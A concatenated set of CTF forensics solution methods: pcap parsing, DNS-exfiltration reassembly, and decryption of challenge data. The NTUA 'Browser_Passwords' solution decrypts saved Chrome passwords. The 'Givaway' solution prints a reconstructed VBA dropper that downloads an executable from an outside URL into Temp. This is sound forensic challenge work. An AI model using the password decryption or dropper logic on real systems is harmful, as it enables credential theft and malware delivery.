            bytes: Output of the connection
        &#34;&#34;&#34;
        bruter = CTFSolver(conn=&#34;remote&#34;, url=self.url, port=self.port)
        bruter.initiate_connection()
        bruter.menu_text = self.menu_text
        bruter.menu_num = self.menu_num
        bruter.send_menu(choice=payload)
        output = bruter.recv_lines(lines, save=True)

        if len(output) &gt; 0:
            return output[0]

        # /home/figaro/CTF/Categories/Binary/ctflearn/Two_Times_Sixteen/payloads/solution.py
    def main(self):
        self.initiate_connection(cwd=self.folders[&#34;data&#34;])

        # /home/figaro/CTF/Categories/Forensics/picoCTF/Blast_from_the_past_picoCTF_2024/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.image_modified = Path(self.folder_data, &#34;modified.jpg&#34;)
        self.copy(self.challenge_file, self.image_modified)

        # /home/figaro/CTF/Categories/Forensics/picoCTF/Blast_from_the_past_picoCTF_2024/payloads/solution.py
    def modify_picture(self):
        image = Image.open(self.challenge_file.as_posix())

        exif_dict = piexif.load(image.info.get(&#34;exif&#34;, b&#34;&#34;))
        # exif_dict = piexif.load(self.challenge_file)
        exif_bytes = piexif.dump(exif_dict)

        for k, v in exif_dict.items():
            print(k, v)

        # /home/figaro/CTF/Categories/Forensics/picoCTF/Blast_from_the_past_picoCTF_2024/payloads/solution.py
    def copy(self, file1, file2):
        with open(file1, &#34;rb&#34;) as f:
            data = f.read(2048 * 2048)
            with open(file2, &#34;wb&#34;) as f2:
                f2.write(data)

        # /home/figaro/CTF/Categories/Forensics/picoCTF/Blast_from_the_past_picoCTF_2024/payloads/solution.py
    def main(self):
        self.modify_picture()

        # /home/figaro/CTF/Categories/Forensics/picoCTF/PcapPoisoning/payloads/solution.py
    def searching_packets(self, packets, text):
        for i, packet in enumerate(packets):
            if packet.haslayer(&#34;Raw&#34;):
                if text.encode() in packet[&#34;Raw&#34;].load:
                    print(f&#34;Found {text} in packet {i}&#34;)
                    print(packet.show())
                    print(packet.summary())
                    return packet[&#34;Raw&#34;].load.decode(&#34;utf-8&#34;)

        # /home/figaro/CTF/Categories/Forensics/picoCTF/PcapPoisoning/payloads/solution.py
    def main(self):
        self.packets = rdpcap(self.challenge_file.as_posix())
        flag = self.searching_packets(self.packets, &#34;pico&#34;)
        print(flag)

        # /home/figaro/CTF/Categories/Forensics/picoCTF/hideme/payloads/solution.py
    def extract_files_from_binary(self, filepath):
        binwalk_obj = binwalk.Binwalk()

        results = binwalk_obj.scan(filepath)

        if not results:
            print(&#34;No files found&#34;)
            return

        for result in results:
            if result.extracted:
                print(f&#34;Extracted {result.file.path}&#34;)
                for extracted_file in result.extracted:
                    print(f&#34;Extracted {extracted_file}&#34;)
            else:
                print(f&#34;Could not extract {result.file.path}&#34;)

        # /home/figaro/CTF/Categories/Forensics/picoCTF/hideme/payloads/solution.py
    def main(self):
        # self.extract_files_from_binary(self.challenge_file)
        pass

        # /home/figaro/CTF/Categories/Forensics/picoCTF/endianness_v2/payloads/solution.py
    def hexdump_to_binary(self, hexdump_file, binary_file):
        with open(hexdump_file, &#34;rb&#34;) as f:
            hexdump_data = f.read()

        hex_data = []

        for i in range(0, len(hexdump_data), 4):
            chunk = hexdump_data[i : i + 4]
            # If the chunk is less than 4 bytes, pad it with zeros
            if len(chunk) &lt; 4:
                # chunk += b&#34;\x00&#34; * (4 - len(chunk))
                chunk = chunk.ljust(4, b&#34;\x00&#34;)
            hex_data.append(f&#34;{struct.unpack(&#39;&lt;I&#39;, chunk)[0]:08x}&#34;)

        hex_output = &#34;&#34;.join(hex_data)

        binary_output = binascii.unhexlify(hex_output)

        with open(binary_file, &#34;wb&#34;) as f:
            f.write(binary_output)

        # /home/figaro/CTF/Categories/Forensics/picoCTF/endianness_v2/payloads/solution.py
    def main(self):
        self.lastfile = Path(self.folder_data, &#34;lastfile&#34;)
        self.hexdump_to_binary(self.challenge_file, self.lastfile)

        # /home/figaro/CTF/Categories/Forensics/picoCTF/Ph4nt0m_1ntrud3r/payloads/solution.py
    def main(self):
        packets = rdpcap(self.challenge_file.as_posix())
        result = {}
        for packet in packets:
            if packet.haslayer(&#34;Raw&#34;) and packet[&#34;Raw&#34;].load is not None:
                result[str(packet.time)] = packet[&#34;Raw&#34;].load

        print(result)

        sorted_keys = sorted(result.keys())
        flag = &#34;&#34;
        for key in sorted_keys:
            if key &gt;= &#34;1741231916.092334&#34;:
                flag += self.decode_base64(result[key].decode(&#34;utf-8&#34;))

        pyperclip.copy(flag)

        # /home/figaro/CTF/Categories/Forensics/picoCTF/flags_are_stepic/payloads/solution.py
    def differ(self):
        self.list_1_file = self.folfil(&#34;files&#34;, &#34;list.txt&#34;)
        self.list_2_file = self.folfil(&#34;files&#34;, &#34;html_list_2.txt&#34;)

        # Read the first list
        with open(self.list_1_file, &#34;r&#34;) as f:
            self.list_1 = f.read().splitlines()

        # Read the second list
        with open(self.list_2_file, &#34;r&#34;) as f:
            self.list_2 = f.read().splitlines()

        # Get the difference between the two lists
        diff = list(set(self.list_1) - set(self.list_2))
        # Print the difference
        print(diff)

        # /home/figaro/CTF/Categories/Forensics/picoCTF/flags_are_stepic/payloads/solution.py
    def download_images(self, name):
        url = f&#34;{self.url}:{self.port}/flags/{name}.png&#34;
        try:
            response = requests.get(url)
            if response.status_code == 200:
                flags_path = self.folfil(&#34;files&#34;, &#34;flags&#34;)
                file_path = self.Path(flags_path, f&#34;{name}.png&#34;)
                with open(file_path, &#34;wb&#34;) as f:
                    f.write(response.content)
                print(f&#34;Downloaded {name}.png&#34;)
            else:
                print(f&#34;Error downloading {name}.png&#34;)
        except Exception as e:
            print(f&#34;Error downloading {name}.png&#34;)
            print(e)

        # /home/figaro/CTF/Categories/Forensics/picoCTF/flags_are_stepic/payloads/solution.py
    def main(self):
        lst = itertools.product(string.ascii_lowercase, repeat=3)
        lst = list(map(lambda x: &#34;&#34;.join(x), lst))

        # for name in lst:
        #     self.download_images(name)

        self.download_images(&#34;upz&#34;)

        # /home/figaro/CTF/Categories/Forensics/bsides/Server_Lookup/payloads/solution.py
    def print_to_File(self, data, verbose=False, file_name=&#34;output.txt&#34;):

        if verbose:
            print(data)
        with open(self.folfil(&#34;data&#34;, file_name), &#34;a&#34;) as f:
            f.write(data + &#34;\n&#34;)

        # /home/figaro/CTF/Categories/Forensics/bsides/Server_Lookup/payloads/solution.py
    def reassemblying_dns(self, packets=None):
        if packets is None:
            packets = self.packets

        hex_parts = []

        dns_packets = []
        for packet in packets:
            # if packet.haslayer(&#34;DNS&#34;) and packet[&#34;DNS&#34;].qr == 0:  # DNS query
            #     query_name = packet[&#34;DNS&#34;].qd.qname.decode(&#34;utf-8&#34;).strip(&#34;.&#34;)
            #     dns_packets.append(query_name)

            if packet.haslayer(DNSQR):
                qname = packet[DNSQR].qname.decode()
                qname = packet[DNSQR].qname.decode(errors=&#34;ignore&#34;).strip(&#34;.&#34;)

                # Extract the first label (before the first dot)
                # part = qname.split(&#34;.&#34;)[0]
                labels = qname.split(&#34;.&#34;)
                for part in labels:
                    # Must be even-length hex and not too short
                    if re.fullmatch(r&#34;[a-fA-F0-9]{2,}&#34;, part) and len(part) % 2 == 0:
                        if part not in hex_parts:
                            hex_parts.append(part)

        hex_data = &#34;&#34;.join(hex_parts)
        try:
            exfiltrated_data = bytes.fromhex(hex_data).decode(&#34;utf-8&#34;)

            with open(self.folfil(&#34;data&#34;, &#34;exfiltrated.txt&#34;), &#34;w&#34;) as f:
                f.write(exfiltrated_data)

        except ValueError:
            exfiltrated_data = &#34;Invalid hex data&#34;

        return exfiltrated_data

        # /home/figaro/CTF/Categories/Forensics/bsides/Server_Lookup/payloads/solution.py
    def breakfiles(self, exfiltrated_data):

        lines = []
        counter = 0
        delimiters = [
            &#34;From&#34;,
            &#34;UEsDBg&#34;,
            &#34;--boundary_AA&#34;,
            &#34;UEsDBg&#34;,
            &#34;Content-Transfer-Encoding: base64&#34;,
        ]

        for line in exfiltrated_data.splitlines():
            if line.startswith(tuple(delimiters)):
                lines.append([])
                counter += 1
            if line != &#34;\n&#34;:
                lines[counter - 1].append(line)

        for i in range(1, counter + 1):
            with open(self.folfil(&#34;data&#34;, f&#34;basefile_{i}.txt&#34;), &#34;w&#34;) as f:
                f.write(&#34;\n&#34;.join(lines[i - 1]))

        # /home/figaro/CTF/Categories/Forensics/bsides/Server_Lookup/payloads/solution.py
    def main(self):
        # self.pcap_open()
        self.packets = rdpcap(self.challenge_file.as_posix())
        data = self.reassemblying_dns()

        exfiltrated_file = self.folfil(&#34;data&#34;, &#34;exfiltrated.txt&#34;)

        with open(exfiltrated_file, &#34;r&#34;) as f:
            exfiltrated_data = f.read()

        self.breakfiles(exfiltrated_data)
        chosen_file = self.folfil(&#34;data&#34;, &#34;basefile_2.txt&#34;)
        with open(chosen_file, &#34;r&#34;) as f:
            base64_data = f.readlines()

        # Clean up the first two and last two  lines
        base64_data = [
            line.strip()
            for i, line in enumerate(base64_data)
            if i not in [0, 1, len(base64_data) - 1, len(base64_data) - 2]
        ]

        # Join and clean only base64 chars
        cleaned_data = &#34;\n&#34;.join(base64_data)

        with open(self.folfil(&#34;data&#34;, &#34;base64formated.txt&#34;), &#34;wb&#34;) as f:
            f.write(cleaned_data.encode(&#34;utf-8&#34;))

        # /home/figaro/CTF/Categories/Forensics/bsides/Charter/payloads/solution.py
    def main(self):
        pass

        # /home/figaro/CTF/Categories/Forensics/CSCG/Somebody_Save_Me/payloads/solution.py
    def main(self):
        strings = self.extract_strings(self.challenge_file, min_length=20)

        strings_sorted = sorted(strings, key=len, reverse=True)
        # print(strings_sorted)

        base64_to_try = [2, 9, 12, 13]

        for i in base64_to_try:
            base64_strings = strings_sorted[i]

            decoded = self.decode_base64(base64_strings)
            if decoded is not None and &#34;csc&#34; in decoded:
                print(decoded)
                break

        # /home/figaro/CTF/Categories/Forensics/CSCG/Logistics/payloads/solution.py
    def main(self):
        text = &#34;mnzwg63ngrrxembvl42hem27oazxezrtmn2gy6k7myyw4m35&#34;

        text = text.upper()
        print(text)

        # /home/figaro/CTF/Categories/Forensics/CSCG/Logistics/payloads/solution.py
    def trying_to_exploit_ods(self):
        # Extract macros from the ODS file
        # macros = self.extract_macros_from_ods_initial()
        # Print the extracted macros

        files = self.list_all_files(self.challenge_file)
        # macros = self.extract_macros_with_odfpy(self.challenge_file)
        macros = self.extract_macros_with_odfpy(self.challenge_file, files)
        print(macros)

        # /home/figaro/CTF/Categories/Forensics/CSCG/Logistics/payloads/solution.py
    def extract_macros_with_odfpy(self, ods_file, files):
        macros = []
        with zipfile.ZipFile(ods_file, &#34;r&#34;) as z:
            for file in files:
                if file.endswith(&#34;.xml&#34;):
                    with z.open(file) as f:
                        try:
                            # Parse the XML file
                            tree = ET.parse(f)
                            root = tree.getroot()

                            # Search for macro-related elements
                            for elem in root.iter():
                                if elem.tag.endswith(&#34;script&#34;):
                                    macros.append(ET.tostring(elem, encoding=&#34;unicode&#34;))

                        except ET.ParseError:
                            print(f&#34;Error parsing {file}. Skipping...&#34;)

        if macros:
            # Pretty-print the extracted macros
            pretty_macros = [
                parseString(macro).toprettyxml(indent=&#34;  &#34;) for macro in macros
            ]
            return &#34;\n\n&#34;.join(pretty_macros)
        else:
            return &#34;No macros found.&#34;

        # /home/figaro/CTF/Categories/Forensics/CSCG/Logistics/payloads/solution.py
    def list_all_files(self, ods_file):
        &#34;&#34;&#34;
        Lists all files in the ODS archive for manual inspection.

        Args:
            ods_file (str): Path to the ODS file.

        Returns:
            list: A list of files inside the ODS archive.
        &#34;&#34;&#34;
        with zipfile.ZipFile(ods_file, &#34;r&#34;) as ods:
            return ods.namelist()

        # /home/figaro/CTF/Categories/Forensics/CSCG/Logistics/payloads/solution.py
    def extract_macros_from_file(self, ods_file, file_name):
        &#34;&#34;&#34;
        Extracts content from a specific file inside the ODS archive.

        Args:
            ods_file (str): Path to the ODS file.
            file_name (str): Name of the file inside the archive to extract.

        Returns:
            str: The content of the specified file.
        &#34;&#34;&#34;
        try:
            with zipfile.ZipFile(ods_file, &#34;r&#34;) as ods:
                with ods.open(file_name) as file:
                    return file.read().decode(&#34;utf-8&#34;)
        except Exception as e:
            return f&#34;Failed to extract {file_name}: {e}&#34;

        # /home/figaro/CTF/Categories/Forensics/CSCG/Logistics/payloads/solution.py
    def extract_macros_from_ods(self, ods_file):
        &#34;&#34;&#34;
        Attempts to extract macros from various files in the ODS archive.

        Args:
            ods_file (str): Path to the ODS file.

        Returns:
            str: Extracted macros or debug information.
        &#34;&#34;&#34;
        try:
            # List all files in the ODS archive
            all_files = self.list_all_files(ods_file)

            # Identify potential macro-related files
            macro_candidates = [
                f
                for f in all_files
                if &#34;scripts&#34; in f or &#34;content&#34; in f or &#34;settings&#34; in f
            ]

            macros = []
            for candidate in macro_candidates:
                content = self.extract_macros_from_file(ods_file, candidate)
                if &#34;&lt;script&#34; in content or &#34;&lt;macro&#34; in content:
                    macros.append(f&#34;--- Content from {candidate} ---\n{content}&#34;)

            if macros:
                return &#34;\n\n&#34;.join(macros)
            else:
                return &#34;No explicit macros found. Check the file structure manually.&#34;

        except Exception as e:
            return f&#34;An error occurred: {e}&#34;

        # /home/figaro/CTF/Categories/Forensics/CSCG/Logistics/payloads/solution.py
    def extract_macros_from_ods_initial(self, ods_file=None):
        &#34;&#34;&#34;
        Extracts macros from an ODS file.

        Args:
            ods_file (str): Path to the ODS file.

        Returns:
            str: Extracted macros, if any, as plain XML text.
        &#34;&#34;&#34;

        if ods_file is None:
            ods_file = self.challenge_file

        try:
            with zipfile.ZipFile(ods_file, &#34;r&#34;) as ods:
                # List all files in the archive
                file_list = ods.namelist()

                # Look for possible macro-related files
                potential_files = [
                    f
                    for f in file_list
                    if f in (&#34;content.xml&#34;, &#34;scripts.xml&#34;, &#34;settings.xml&#34;, &#34;meta.xml&#34;)
                ]
                macros = []

                for file_name in potential_files:
                    with ods.open(file_name) as file:
                        xml_content = file.read()
                        root = ET.fromstring(xml_content)

                        # Search for common macro tags (e.g., &lt;script&gt;, &lt;macro&gt;)
                        for macro in root.iter():
                            if any(
                                keyword in macro.tag.lower()
                                for keyword in (&#34;script&#34;, &#34;macro&#34;)
                            ):
                                macros.append(ET.tostring(macro, encoding=&#34;unicode&#34;))

                if macros:
                    return &#34;\n\n&#34;.join(macros)
                else:
                    return &#34;No macros found in the ODS file.&#34;

        except zipfile.BadZipFile:
            return &#34;The provided file is not a valid ODS file.&#34;
        except ET.ParseError:
            return &#34;Failed to parse XML content from the ODS file.&#34;
        except Exception as e:
            return f&#34;An error occurred: {e}&#34;

        # /home/figaro/CTF/Categories/Forensics/NTUA/Browser_Passwords/payloads/solution.py
    def connecting_db(self):
        with sqlite3.connect(self.challenge_file) as conn:
            cursor = conn.cursor()
            cursor.execute(
                &#34;SELECT action_url, username_value, password_value FROM logins&#34;
            )
            return cursor.fetchall()

        # /home/figaro/CTF/Categories/Forensics/NTUA/Browser_Passwords/payloads/solution.py
    def load_master_key(self):
        with open(self.Path(self.folder_files, &#34;mkey.json&#34;), &#34;r&#34;) as mkey_file:
            mkey_data = json.load(mkey_file)
        master_key_id = list(mkey_data[&#34;masterkeys&#34;].keys())[0]
        master_key = bytes.fromhex(mkey_data[&#34;masterkeys&#34;][master_key_id])
        return master_key

        # /home/figaro/CTF/Categories/Forensics/NTUA/Browser_Passwords/payloads/solution.py
    def main(self):
        with open(self.Path(self.folder_files, &#34;Local_State&#34;)) as login_state:
            login_state = json.load(login_state)

        encrypted_key = login_state[&#34;os_crypt&#34;][&#34;encrypted_key&#34;]
        encrypted_key = base64.b64decode(encrypted_key)[2:-1]
        # decrypted_key = win32crypt.CryptUnprotectData(
        #     encrypted_key, None, None, None, 0
        # )[1]

        # master_key = self.load_master_key()
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[
            1
        ]

        print(&#34;Connecting to database&#34;)
        logins = self.connecting_db()

        url = logins[0][0]
        username = logins[0][1]
        password = logins[0][2]
        print(password)
        # decrypted = self.decrypt_password(password, encrypted_key)
        decrypted = self.decrypt_password(password, master_key)

        print(decrypted)

        # /home/figaro/CTF/Categories/Forensics/NTUA/Browser_Passwords/payloads/solution.py
    def generate_cipher(self, aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

        # /home/figaro/CTF/Categories/Forensics/NTUA/Browser_Passwords/payloads/solution.py
    def decrypt_payload(self, cipher, payload):
        return cipher.decrypt(payload)

        # /home/figaro/CTF/Categories/Forensics/NTUA/Browser_Passwords/payloads/solution.py
    def decrypt_password(self, ciphertext, secret_key):
        try:
            # (3-a) Initialisation vector for AES decryption
            initialisation_vector = ciphertext[3:15]
            # (3-b) Get encrypted password by removing suffix bytes (last 16 bits)
            # Encrypted password is 192 bits
            encrypted_password = ciphertext[15:-16]
            # (4) Build the cipher to decrypt the ciphertext
            cipher = self.generate_cipher(secret_key, initialisation_vector)
            decrypted_pass = self.decrypt_payload(cipher, encrypted_password)
            decrypted_pass = decrypted_pass.decode()
            return decrypted_pass
        except Exception as e:
            print(&#34;%s&#34; % str(e))
            print(
                &#34;[ERR] Unable to decrypt, Chrome version &lt;80 not supported. Please check.&#34;
            )
            return &#34;&#34;

        # /home/figaro/CTF/Categories/Forensics/NTUA/Givaway/payloads/solution.py
    def translated(self):  # Reconstructing the strings based on the VBA code logic
        part_1 = (
            &#34;https://elvesfactory/&#34;
            + chr(ord(&#34;H&#34;))
            + chr(84)
            + chr(ord(&#34;B&#34;))
            + &#34;&#34;
            + chr(123)
            + &#34;&#34;
            + chr(84)
            + chr(ord(&#34;h&#34;))
            + &#34;1&#34;
            + chr(125 - 10)
            + chr(ord(&#34;_&#34;))
            + &#34;1s&#34;
            + chr(95)
            + &#34;4&#34;
        )
        part_2 = &#34;_&#34; + &#34;present&#34;.replace(&#34;e&#34;, &#34;3&#34;) + chr(85 + 10)
        part_3 = &#34;everybody&#34;.replace(&#34;e&#34;, &#34;3&#34;)
        part_3 = part_3.replace(&#34;o&#34;, &#34;0&#34;) + &#34;_&#34;
        part_4 = (
            chr(ord(&#34;w&#34;))
            + &#34;4&#34;
            + chr(110)
            + &#34;t&#34;
            + chr(115)
            + &#34;_&#34;
            + chr(ord(&#34;f&#34;))
            + &#34;0&#34;
            + chr(121 - 7)
            + chr(95)
        )
        part_5 = &#34;christmas&#34;.replace(&#34;i&#34;, &#34;1&#34;)
        part_5 = part_5.replace(&#34;a&#34;, &#34;4&#34;) + chr(119 + 6)

        # Resultant concatenated string for &#34;strRT&#34;
        part_6 = part_1 + part_2 + part_3 + part_4 + part_5

        # Generating the &#39;strTecation&#39; path
        part_7 = &#34;c:\\&#34; + chr(ord(&#34;W&#34;)) + &#34;indows\\&#34; + chr(ord(&#34;T&#34;)) + &#34;emp\\444.exe&#34;

        # Placeholder for variable `mttt`, assuming it is defined elsewhere
        mttt = 120  # Adjust as per VBA code logic
        part_7 = (
            &#39;CreateObject(&#34;MSXML2.&#39;
            + chr(mttt - 54)
            + chr(mttt)
            + chr(mttt - 11)
            + chr(mttt - 12)
            + chr(72)
            + chr(84)
            + chr(84)
            + chr(80)
            + &#39;&#34;)&#39;
        )

        # Simulating VBA code file writing
        output_lines = []
        output_lines.append(f&#34;strRT = {part_6}&#34;)
        output_lines.append(f&#39;strTecation = &#34;{part_7}&#34;&#39;)
        output_lines.append(f&#34;Set objXMLHTTP = {part_7}&#34;)
        output_lines.append(&#39;objXMLHTTP.open &#34;GET&#34;, strRT, False&#39;)
        output_lines.append(&#34;objXMLHTTP.send()&#34;)
        output_lines.append(&#34;If objXMLHTTP.Status = 200 Then&#34;)
        output_lines.append(&#39;Set objADOStream = CreateObject(&#34;ADODB.Stream&#34;)&#39;)
        output_lines.append(&#34;objADOStream.Open&#34;)
        output_lines.append(&#34;objADOStream.Type = 1&#34;)
        output_lines.append(&#34;objADOStream.Write objXMLHTTP.ResponseBody&#34;)
        output_lines.append(&#34;objADOStream.Position = 0&#34;)
        output_lines.append(f&#34;objADOStream.SaveToFile {part_7}&#34;)
        output_lines.append(&#34;objADOStream.Close&#34;)
        output_lines.append(&#34;Set objADOStream = Nothing&#34;)
        output_lines.append(&#34;End if&#34;)
        output_lines.append(&#34;Set objXMLHTTP = Nothing&#34;)
        output_lines.append(&#39;Set objShell = CreateObject(&#34;WScript.Shell&#34;)&#39;)

        # Printing the output lines (would typically write to a file)
        for line in output_lines:
            print(line)

        # Values of constructed variables for validation
        print(&#34;Constructed Values:&#34;)
        print(&#34;HPkXUcxLcAoMHOlj:&#34;, part_1)
        print(&#34;cxPZSGdIQDAdRVpziKf:&#34;, part_2)
        print(&#34;fqtSMHFlkYeyLfs:&#34;, part_3)
        print(&#34;ehPsgfAcWaYrJm:&#34;, part_4)
        print(&#34;FVpHoEqBKnhPO:&#34;, part_5)
        print(&#34;strRT:&#34;, part_6)
        print(&#34;strTecation:&#34;, part_7)

        # /home/figaro/CTF/Categories/Forensics/NTUA/Givaway/payloads/solution.py
    def main(self):
        self.translated()

        # /home/figaro/CTF/Categories/Forensics/NTUA/ICMP_Party/payloads/solution.py
    def get_packets_icmp(self, packets=None):
        &#34;&#34;&#34;
        Description:
        Get all the ICMP packets from the packets

        Args:
            packets (list, optional): List of packets to search in. Defaults to None.

        Returns:
            list: List of ICMP packets
        &#34;&#34;&#34;

        if packets is None:
            packets = self.packets

        icmp_packets = [packet for packet in packets if packet.haslayer(&#34;ICMP&#34;)]

        return icmp_packets

        # /home/figaro/CTF/Categories/Forensics/NTUA/ICMP_Party/payloads/solution.py
    def get_packet_ttl(self, packets=None):
        &#34;&#34;&#34;
        Description:
        Get the TTL of all the ICMP packets

        Args:
            packets (list, optional): List of packets to search in. Defaults to None.

        Returns:
            list: List of TTL of the ICMP packets
        &#34;&#34;&#34;
        if packets is None:
            packets = self.packets

        icmp_ttl = [packet.ttl for packet in packets]

        return icmp_ttl

        # /home/figaro/CTF/Categories/Forensics/NTUA/ICMP_Party/payloads/solution.py
    def main(self):
        self.pcap_open()
        icmp_packets = self.get_packets_icmp()
        ttl = self.get_packet_ttl(packets=icmp_packets)

        flag = &#34;&#34;
        for i in ttl:
            if i != 64:
                flag += chr(i)
        print(flag)

        # /home/figaro/CTF/Categories/Forensics/NTUA/PDF_1/payloads/solution.py
    def main(self):
        text = self.textFromPDF()
        partial_flag = &#34;NH&#34;
        shift = self.rot_bruteforce(text, partial_flag)
        # ROT47
        print(f&#34;Shift: {shift}&#34;)
        flag = self.rot(text, shift)
        self.flag = flag
        print(f&#34;Flag: {flag}&#34;)

        # /home/figaro/CTF/Categories/Forensics/NTUA/PDF_1/payloads/solution.py
    def rot_bruteforce(self, crypted_text, known_text, max_shift=94):
        &#34;&#34;&#34;
        Brute forces ROT47 shifts to find the one that contains the known text.

        Args:
            crypted_text (str): The encrypted text.
            known_text (str): The known plaintext to look for.
            max_shift (int): The maximum shift to attempt (ROT47 has 94 shifts).

        Returns:
            int: The shift that contains the known text, or -1 if not found.
        &#34;&#34;&#34;
        for shift in range(1, max_shift):
            decrypted_text = self.rot(crypted_text, shift)
            if known_text.lower() in decrypted_text.lower():
                return shift
        return -1

        # /home/figaro/CTF/Categories/Forensics/NTUA/PDF_1/payloads/solution.py
    def rot(self, text, shift):
        &#34;&#34;&#34;
        Applies the ROT47 cipher to the given text with the specified shift.

        Args:
            text (str): The input text.
            shift (int): The ROT47 shift amount.

        Returns:
            str: The transformed text.
        &#34;&#34;&#34;
        return &#34;&#34;.join([self.rot_char(c, shift) for c in text])

        # /home/figaro/CTF/Categories/Forensics/NTUA/PDF_1/payloads/solution.py
    def rot_char(self, c, shift):
        &#34;&#34;&#34;
        Rotates a single character using the ROT47 cipher.

        Args:
            c (str): The input character.
            shift (int): The ROT47 shift amount.

        Returns:
            str: The rotated character.
        &#34;&#34;&#34;
        ascii_code = ord(c)
        if 33 &lt;= ascii_code &lt;= 126:  # ROT47 only affects printable ASCII
            return chr((ascii_code - 33 + shift) % 94 + 33)
        return c

        # /home/figaro/CTF/Categories/Forensics/NTUA/PDF_1/payloads/solution.py
    def textFromPDF(self, file=None):
        &#34;&#34;&#34;
        Extracts text from a PDF file.

        Args:
            file (str): Path to the PDF file. Defaults to the challenge file.

        Returns:
            str: The extracted text.
        &#34;&#34;&#34;
        if file is None:
            file = self.challenge_file

        with pdfplumber.open(file) as pdf:
            text = &#34;&#34;
            for page in pdf.pages:
                text += page.extract_text()
        return text

        # /home/figaro/CTF/Categories/Forensics/HTB/Fake_Boost/payloads/solution.py
    def main(self):
        self.challenge_file = self.Path(self.folder_data, self.file)

        self.aes_key_base64 = &#34;Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k=&#34;
        self.aes_key = base64.b64decode(self.aes_key_base64)
        encrypted_base64 = open(self.challenge_file, &#34;r&#34;).read().strip()
        decrypted_text = self.decrypt_string(encrypted_base64, self.aes_key)
        print(&#34;Decrypted text:&#34;, decrypted_text)

        # /home/figaro/CTF/Categories/Forensics/HTB/Fake_Boost/payloads/solution.py
    def decrypt_string(self, encrypted_base64, key):
        full_data = base64.b64decode(encrypted_base64)

        iv = full_data[: AES.block_size]
        encrypted_message = full_data[AES.block_size :]

        cipher = AES.new(key, AES.MODE_CBC, iv)

        decrypted_bytes = cipher.decrypt(encrypted_message)

        pad = decrypted_bytes[-1]
        decrypted_bytes = decrypted_bytes[:-pad]

        return decrypted_bytes.decode(&#34;utf-8&#34;)

        # /home/figaro/CTF/Categories/Forensics/HTB/Binary_Badresources/payloads/solution.py
    def main(self):
        encrypted_text = &#34;ZzfccaKJB3CrDvOnj/6io5OR7jZGL0pr0sLO/ZcRNSa1JLrHA+k2RN1QkelHxKVvhrtiCDD14Aaxc266kJOzF59MfhoI5hJjc5hx7kvGAFw=&#34;

        password = &#34;vudzvuokmioomyialpkyydvgqdmdkdxy&#34;

        decrypted_text = self.decrypt(encrypted_text, password)
        print(&#34;Decrypted text:&#34;, decrypted_text)

        # /home/figaro/CTF/Categories/Forensics/HTB/Binary_Badresources/payloads/solution.py
    def derive_key_and_iv(self, password, salt, key_length, iv_length):
        d = SHA256.new()
        d.update(password.encode(&#34;utf-8&#34;))
        key = d.digest()[:key_length]
        iv = salt.encode(&#34;utf-8&#34;)[:iv_length]
        return key, iv

        # /home/figaro/CTF/Categories/Forensics/HTB/Binary_Badresources/payloads/solution.py
    def decrypt(self, ciphertext_base64, password):
        ciphertext = base64.b64decode(ciphertext_base64)
        salt = &#34;tbbliftalildywic&#34;

        key, iv = self.derive_key_and_iv(password, salt, 32, 16)

        cipher = AES.new(key, AES.MODE_CBC, iv)

        plaintext = cipher.decrypt(ciphertext)

        plaintext = plaintext.rstrip(b&#34;\x00&#34;)

        return plaintext.decode(&#34;utf-8&#34;)

        # /home/figaro/CTF/Categories/Forensics/HTB/Data_Siege/payloads/solution.py
    def main(self):
        # Get packets from the pcap file
        self.pcap_open()

        tcp_stream_5 = self.get_tcp_stream(5)

        tcp_stream_5 = self.creating_stream(packets=tcp_stream_5)[0]

        # To get the payload
        data_24 = bytes(tcp_stream_5[25][TCP].payload)
        data_45 = bytes(tcp_stream_5[45][TCP].payload).decode()

        # print(base64.b64decode(data_24))

        payload_base64 = data_45.split(&#39;&#34;&#39;)[1]

        payload = base64.b64decode(payload_base64).decode()
        print(payload)

        # /home/figaro/CTF/Categories/Forensics/HTB/Data_Siege/payloads/solution.py
    def get_tcp_stream(self, number):
        tcp_streams = self.creating_stream()
        return tcp_streams[number]

        # /home/figaro/CTF/Categories/Forensics/HTB/Data_Siege/payloads/solution.py
    def stream_identifier(self, pkt):
        if TCP in pkt:
            src = pkt[IP].src
            dst = pkt[IP].dst
            sport = pkt[TCP].sport
            dport = pkt[TCP].dport
            # Create a unique identifier for both directions
            return tuple(sorted([(src, sport), (dst, dport)]))
        return None

        # /home/figaro/CTF/Categories/Forensics/HTB/Data_Siege/payloads/solution.py
    def creating_stream(self, packets=None, save=False, return_dict=False):

        if packets is None:
            packets = self.packets

        # Dictionary to hold streams
        tcp_streams = {}

        # Iterate over packets to group them into streams
        for pkt in packets:
            if TCP in pkt:
                stream_id = self.stream_identifier(pkt)
                if stream_id:
                    if stream_id not in tcp_streams:
                        tcp_streams[stream_id] = []
                    tcp_streams[stream_id].append(pkt)

        if return_dict:
            return tcp_streams

        tcp_streams = list(tcp_streams.values())

        return tcp_streams

        # /home/figaro/CTF/Categories/Forensics/HTB/Cave_Expedition/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

        self.folder_logs = self.Path(self.folders[&#34;files&#34;], &#34;Logs&#34;)
        self.folder_xml = self.Path(self.folders[&#34;data&#34;], &#34;xml&#34;)

        # /home/figaro/CTF/Categories/Forensics/HTB/Cave_Expedition/payloads/solution.py
    def xor_decrypt(self, data: bytes, key1: bytes, key2: bytes = None) -&gt; bytes:
        output = bytearray(len(data))
        key1 = bytearray(key1)
        if key2:
            key2 = bytearray(key2)
        for i in range(len(data)):
            k1 = key1[i % len(key1)]
            if key2:
                k2 = key2[i % len(key2)]
                output[i] = data[i] ^ k1 ^ k2
            else:
                output[i] = data[i] ^ k1
        return bytes(output)

        # /home/figaro/CTF/Categories/Forensics/HTB/Cave_Expedition/payloads/solution.py
    def emilia_main(self):

        # Key from $a53Va (known good key)
        # NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg==
        key1_b64 = &#34;NXhzR09iakhRaVBBR2R6TGdCRWVJOHUwWVNKcTc2RWl5dWY4d0FSUzdxYnRQNG50UVk1MHlIOGR6S1plQ0FzWg==&#34;
        key1 = base64.b64decode(key1_b64)
        # key1 = base64.b64decode(key1)

